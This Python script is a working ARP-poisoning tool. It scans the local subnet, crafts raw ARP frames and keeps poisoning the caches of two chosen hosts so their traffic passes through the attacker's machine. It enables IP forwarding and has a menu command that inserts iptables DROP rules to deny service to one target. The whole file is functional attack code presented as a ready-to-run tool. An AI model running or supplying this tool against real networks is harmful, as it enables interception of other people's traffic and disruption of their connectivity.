import struct
import socket
import codecs
import time
import netifaces
import ipaddress
import multiprocessing
import iptc


class Arp:
    def __init__(self):
        self.source_MAC = None
        self.source_IP = None

        self.target_MAC = None
        self.target_IP = None

        self.socket = None

    def craft_packet(self,sm,si,tm,ti,op):
        self.source_MAC = codecs.decode( sm.replace(":","").strip() ,"hex")
        self.source_IP  = self.ipv4_to_bytes(si)

        self.target_MAC = codecs.decode( tm.replace(":","").strip() ,"hex")
        self.target_IP  = self.ipv4_to_bytes(ti)
        if op == 1:
           opcode = b'\x00\x01'
        elif op == 2:
           opcode = b'\x00\x02'
        packet = [
        #ARP Layer
        b'\x00\x01',
        b'\x08\x00',
        b'\x06\x04',
        opcode,
        self.source_MAC,
        self.source_IP,
        self.target_MAC,
        self.target_IP
        ##############
        ]
        return packet
    def eth_encap(self,source,target):
        source = codecs.decode( source.replace(":","").strip() ,"hex")
        target = codecs.decode( target.replace(":","").strip() ,"hex")
        eth = [
        #ETHERNET Layer
        target,
        source,
        b'\x08\x06',
        ##############
        ]
        return eth
    def arp_gratuitous(self,interface,ip,mac):

        p = self.craft_packet(mac,ip,"ff:ff:ff:ff:ff:ff",ip,2)
        ether = self.eth_encap(mac,"ff:ff:ff:ff:ff:ff")
        packet = ether + p

        self.send_packet(interface,packet)

    def arp_gratuitous_targeted(self,interface,ip,mac,tmac):

        p = self.craft_packet(mac,ip,mac,ip,2)
        ether = self.eth_encap(mac,tmac)
        packet = ether + p

        self.send_packet(interface,packet)

    def targeted_mitm(self,interface,ip1,ip2,ip1_mac,ip2_mac):

        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,socket.SOCK_RAW)
        sock.bind((interface, socket.SOCK_RAW))

        duration = 5

        # self.arp_probe(interface,ip1)
        # reply = get_arp_reply(sock,interface,ip1)
        # while reply == None:
        #     self.arp_probe(interface,ip1)
        #     reply = get_arp_reply(sock,interface,ip1)
        # ip1_mac =self.bytes_to_mac(reply["sm"])
        #
        # self.arp_probe(interface,ip2)
        # reply = get_arp_reply(sock,interface,ip2)
        # while reply == None:
        #     self.arp_probe(sock,interface,ip2)
        #     reply = get_arp_reply(interface,ip2)
        # ip2_mac =self.bytes_to_mac(reply["sm"])


        #print(ip1_mac,ip2_mac)
        start = time.time()

        self.arp_gratuitous(interface,ip1,get_mac(interface))
        self.arp_gratuitous(interface,ip2,get_mac(interface))


        while True:
            current = time.time()
            elapsed = current - start

            if elapsed > duration:
                #print("poisoning...again after",elapsed,"seconds")
                self.arp_gratuitous_targeted(interface,ip1,get_mac(interface),ip2_mac)
                self.arp_gratuitous_targeted(interface,ip2,get_mac(interface),ip1_mac)

                self.arp_gratuitous(interface,ip1,get_mac(interface))
                self.arp_gratuitous(interface,ip2,get_mac(interface))
                # self.arp_gratuitous_targeted(interface,ip1,get_mac(interface),get_mac(interface))
                # self.arp_gratuitous_targeted(interface,ip2,get_mac(interface),get_mac(interface))
                start = time.time()


    def send_packet(self,interface,packet):
        self.socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,socket.SOCK_RAW)
        self.socket.bind((interface, socket.SOCK_RAW))

        self.socket.send(b''.join(packet))

    def arp_probe(self,interface,ip):
        mac = get_mac(interface)
        #print(mac)
        # print(mac.replace(":","").strip()+"hi")
        # codecs.decode( mac.replace(":","") ,"hex")
        p = self.craft_packet(mac,get_ip(interface),"00:00:00:00:00:00",ip,1)
        ether = self.eth_encap(mac,"ff:ff:ff:ff:ff:ff")
        packet = ether + p
        self.send_packet(interface,packet)
    def bytes_to_mac(self,bytes):
        if len(bytes) == 6:
            a = bytes.hex()
            mac = ""
            top = 0
            bot = 2
            for i in range(len(bytes)):
                b = a[top:bot]
                top += 2
                bot += 2
                mac = mac + b
                if i !=5:
                     mac += ":"
                #print(i)
            return mac
        else:
            raise ValueError("Byte-String not size of MAC address")


    def ipv4_to_bytes(self,ip):
         ip_part = ip.split('.')
         buffer = b''
         for part in ip_part:
             a = bytes([int(part)])
             buffer += a

         return buffer

def get_arp_reply(sock,interface,ip):
    start = time.time()
    timeout = .005
    ownMAC = get_mac(interface).replace(":","").strip()

    current =4
    elapsed = 0
    while elapsed < timeout:
        # start = time.time()
        packet = sock.recvfrom(get_mtu(interface))
        packet = packet[0]
        destMAC = packet[0:6].hex()
        if packet[12:14] == b'\x08\06': # Ethernet TYPE : ARP
            #print("OUR MAC: ",len(ownMAC))
            #print("DEST: ",len(destMAC))
            if destMAC == ownMAC:
                # print(ipv4_to_bytes(ip))
                # print(packet[28:32])
                if packet[20:22] == b'\x00\x02' and ipv4_to_bytes(ip) == packet[28:32]:
                    return {'sm':packet[22:28],'si':packet[28:32]}
        current = time.time()
        elapsed = current - start
        #print("elapsed: ",elapsed)
    return None

def ipv4_to_bytes(ip):
     ip_part = ip.split('.')
     buffer = b''
     for part in ip_part:
         a = bytes([int(part)])
         buffer += a

     return buffer
def get_mac(interface):
    mac = netifaces.ifaddresses(interface)[17][0]["addr"]
    return mac
def get_ip(interface):
    ip = netifaces.ifaddresses(interface)[2][0]["addr"]
    return ip
def get_mtu(interface):
    mac = open("/sys/class/net/"+interface+"/mtu")
    return int(mac.read())
def get_ip_broadcast(interface):
    a = netifaces.ifaddresses(interface)[2][0]["broadcast"]
    return a
def get_netmask(interface):
    netmask = netifaces.ifaddresses(interface)[2][0]["netmask"]
    return netmask
def enable_ipv4_forwarding():
    file = open("/proc/sys/net/ipv4/ip_forward","w")
    file.write("1")
def select_network():
    nets = {}
    count = 1
    for net in netifaces.interfaces():
        print(count,"- "+net)
        nets[count] = net
        count += 1

    #print(nets)
    selection = input("Select which interface you would like to use: ")
    return nets[int(selection)]
def list_hosts(interface):
    hosts = []
    mask = get_netmask(interface)
    broadcast = get_ip_broadcast(interface)
    broadcast = broadcast.replace("255","0")
    a = list(ipaddress.IPv4Network(broadcast+"/"+mask).hosts())
    for i in a:
        hosts.append(str(i))
    return hosts

def drop_icmp(interface,src_ip):
    rule = iptc.Rule()
    rule.src = src_ip
    rule.in_interface = interface
    rule.protocol = "icmp"
    t = rule.create_target("DROP")
    rule.target = t
    chain = iptc.Chain(iptc.Table(iptc.Table.FILTER), "FORWARD")
    chain.insert_rule(rule)
    return rule
def drop_all(interface,src_ip):
    rule = iptc.Rule()
    rule.src = src_ip
    rule.in_interface = interface
    #rule.protocol = "icmp"
    t = rule.create_target("DROP")
    rule.target = t
    chain = iptc.Chain(iptc.Table(iptc.Table.FILTER), "FORWARD")
    chain.insert_rule(rule)
    return rule
def remove_rule(rule):
    chain = iptc.Chain(iptc.Table(iptc.Table.FILTER), "FORWARD")
    chain.delete_rule(rule)

def get_net_map(interface):
    arp = Arp()
    netmap = {}
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,socket.SOCK_RAW)
    sock.bind((interface, socket.SOCK_RAW))
    hosts = list_hosts(interface)

    for ip in hosts:
        print(ip)
        reply = None
        for i in range(1):
            arp.arp_probe(interface,ip)
            reply = get_arp_reply(sock,interface,ip)
        if reply != None:
            ip_mac =arp.bytes_to_mac(reply["sm"])
            netmap[ip] = ip_mac

    return netmap
def get_arp_map(interface,ip):
    arp = Arp()
    netmap = {}
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,socket.SOCK_RAW)
    sock.bind((interface, socket.SOCK_RAW))
    for i in range(1):
        arp.arp_probe(interface,ip)
        reply = get_arp_reply(sock,interface,ip)
    if reply != None:
        ip_mac = arp.bytes_to_mac(reply["sm"])
        netmap[ip] = ip_mac
    return netmap
def select_targets(hosts):
    a = list(hosts.keys())
    targets = {}
    count = 1

    for ip in a:
        print(count,"- "+ip)
        targets[count] = ip
        count += 1
    ip1 = input("Select first target: ")
    ip2 = input("Select second target: ")
    return targets[int(ip1)],targets[int(ip2)]
def restore_tables(interface,dict):
    arp = Arp()
    for i in range(3):
        for ip in dict:
            arp.arp_gratuitous(interface,ip,dict[ip])
        time.sleep(1)
def main():
    arp = Arp()

    enable_ipv4_forwarding()
    interface = select_network()
    original = None
    select = input("Would you like to [scan/manual]ly get input: ")
    if select == "scan":
        hosts = get_net_map(interface)
        #print(hosts)
        ip1,ip2 = select_targets(hosts)
        ip1_mac = hosts[ip1]
        ip2_mac = hosts[ip2]
        mac = get_mac(interface)
        original = {ip1:ip1_mac,ip2:ip2_mac}
    elif select == "manual":
        IP_selected = False
        while IP_selected == False:

            ip1 = input("Input IP #1: ")
            ip2 = input("Input IP #2: ")

            if ip1 in list_hosts(interface) and ip2 in list_hosts(interface):

                ip1_map = get_arp_map(interface,ip1)
                ip2_map = get_arp_map(interface,ip2)
                print(ip1_map,ip2_map)
                if len(ip1_map) != 0 and len(ip2_map) != 0:
                    ip1_mac = ip1_map[ip1]
                    ip2_mac = ip2_map[ip2]
                    IP_selected = True
                    original = {ip1:ip1_mac,ip2:ip2_mac}
                else:
                    print("One or more IPs were not valid for this network")
            else:
                print("One or more IPs were not valid for this network")
    selected_rule = None
    engageDOS = False
    exit = False
    mitm_thread = None
    while exit == False:
        cur = input("type [HELP/?] for options: ")
        if cur == "START":
            mitm_thread = multiprocessing.Process(target=arp.targeted_mitm,args=(interface,ip1,ip2,ip1_mac,ip2_mac))
            mitm_thread.start()
            print("Poisoning started")
        elif cur == "STOP":
            if mitm_thread != None:
                mitm_thread.terminate()
                print("Poisoning stopped")
                print("Restoring original tables...")
                restore_tables(interface,original)
        elif cur == "DOS":
            if not engageDOS:
                print("Which IP would you like to block from passing through?")
                print("1. ",ip1)
                print("2. ",ip2)
                select = input("> ")
                if select == "1":
                    selected_rule = drop_all(interface,ip1)
                    engageDOS = True
                elif select == "2":
                    selected_rule = drop_all(interface,ip2)
                    engageDOS = True
                else:
                    print("[ERROR] User failed to input valid choice")
            else:
                print("Denial of Service already active, try undoing")
        elif cur == "UNDO DOS":
            remove_rule(selected_rule)
        elif cur == "HELP" or cur == "?":
            print("COMMANDS:")
            print("START ------> Starts MITM Attack")
            print("STOP -------> Stops MITM Attack")
            print("DOS --------> Perform Denial of Service")
            print("UNDO DOS ---> Returns Service to Normal ")
            print("EXIT -------> Leave Tool")
        elif cur == "EXIT":
            if mitm_thread != None:
                mitm_thread.terminate()
                restore_tables(interface,original)
            exit = True
        else:
            print("[ERROR] User failed to input valid choice")
    # for i in range(1):
    #     #arp.arp_gratuitous("wlp3s0","192.168.1.8",mac)
    #     #arp.arp_probe("wlp3s0","192.168.1.16")
    #     #mitm_thread = threading.Thread(target=arp.target_mitm,args=(interface,ip1,ip2))
    #     pass
    #     #arp.targeted_mitm("wlp3s0","192.168.1.8","192.168.1.1")

main()
